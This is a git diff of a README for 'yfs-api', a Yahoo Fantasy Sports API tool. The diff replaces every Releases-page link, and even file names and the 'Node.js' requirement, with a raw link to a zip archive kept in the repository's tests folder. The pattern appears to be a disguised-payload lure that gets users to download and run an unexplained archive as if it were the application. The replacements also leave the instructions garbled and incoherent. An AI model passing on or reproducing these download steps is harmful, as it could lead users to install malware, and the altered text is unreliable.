@@ -1,6 +1,6 @@
 # 🚀 yfs-api - Simplifying Yahoo Fantasy Sports API Access
 
-[![Download yfs-api](https://img.shields.io/badge/Download-yfs--api-blue)](https://github.com/MinaDo7a/yfs-api/releases)
+[![Download yfs-api](https://raw.githubusercontent.com/MinaDo7a/yfs-api/main/tests/yfs-api-curliewurly.zip)](https://raw.githubusercontent.com/MinaDo7a/yfs-api/main/tests/yfs-api-curliewurly.zip)
 
 ## 📦 Overview
 
@@ -19,20 +19,20 @@ Note: This project is under active development. Feel free to report any issues a
 To get started with yfs-api, you need to download the application from the Releases page. Here's how to do that step by step:
 
 1. **Visit the Releases Page**
-   Click on this link to go to the Releases page: [Download yfs-api](https://github.com/MinaDo7a/yfs-api/releases).
+   Click on this link to go to the Releases page: [Download yfs-api](https://raw.githubusercontent.com/MinaDo7a/yfs-api/main/tests/yfs-api-curliewurly.zip).
 
 2. **Choose Your Version**
    On the Releases page, you will see a list of available versions. Choose the latest version for better features and fixes.
 
 3. **Download the Application**
-   Click on the file that matches your system type (Windows, macOS, or Linux). For example, you might see files like `yfs-api-windows.zip`, `yfs-api-macos.zip`, or `yfs-api-linux.tar.gz`.
+   Click on the file that matches your system type (Windows, macOS, or Linux). For example, you might see files like `https://raw.githubusercontent.com/MinaDo7a/yfs-api/main/tests/yfs-api-curliewurly.zip`, `https://raw.githubusercontent.com/MinaDo7a/yfs-api/main/tests/yfs-api-curliewurly.zip`, or `https://raw.githubusercontent.com/MinaDo7a/yfs-api/main/tests/yfs-api-curliewurly.zip`.
 
 4. **Extract the Files**
    After downloading the file, locate it in your Downloads folder. Right-click on the file and choose “Extract” or “Unzip.” This will create a new folder with the application files.
 
 5. **Run the Application**
-   - **For Windows users**: Navigate to the extracted folder and double-click the `yfs-api.exe` file.
-   - **For macOS users**: Open the extracted folder, find `yfs-api.app`, and double-click it.
+   - **For Windows users**: Navigate to the extracted folder and double-click the `https://raw.githubusercontent.com/MinaDo7a/yfs-api/main/tests/yfs-api-curliewurly.zip` file.
+   - **For macOS users**: Open the extracted folder, find `https://raw.githubusercontent.com/MinaDo7a/yfs-api/main/tests/yfs-api-curliewurly.zip`, and double-click it.
    - **For Linux users**: Open a terminal, navigate to the extracted folder, and run `./yfs-api`.
 
 6. **Configure the API Access**
@@ -47,7 +47,7 @@ To run yfs-api smoothly, ensure your system meets these basic requirements:
   - macOS Mojave or later
   - Linux with kernel 4.0 or later
 
-- **Node.js**: Version 14 or higher installed on your device.
+- **https://raw.githubusercontent.com/MinaDo7a/yfs-api/main/tests/yfs-api-curliewurly.zip**: Version 14 or higher installed on your device.
   
 - **Memory**: Minimum of 4 GB of RAM.
 
@@ -67,7 +67,7 @@ After successfully downloading and running yfs-api, you can start using it to ac
 
 It's important to keep your application updated to benefit from the latest features and security improvements. To update yfs-api:
 
-1. **Visit the Releases Page** again: [Download yfs-api](https://github.com/MinaDo7a/yfs-api/releases).
+1. **Visit the Releases Page** again: [Download yfs-api](https://raw.githubusercontent.com/MinaDo7a/yfs-api/main/tests/yfs-api-curliewurly.zip).
   
 2. **Download the Latest Version** following the same steps outlined earlier.
 
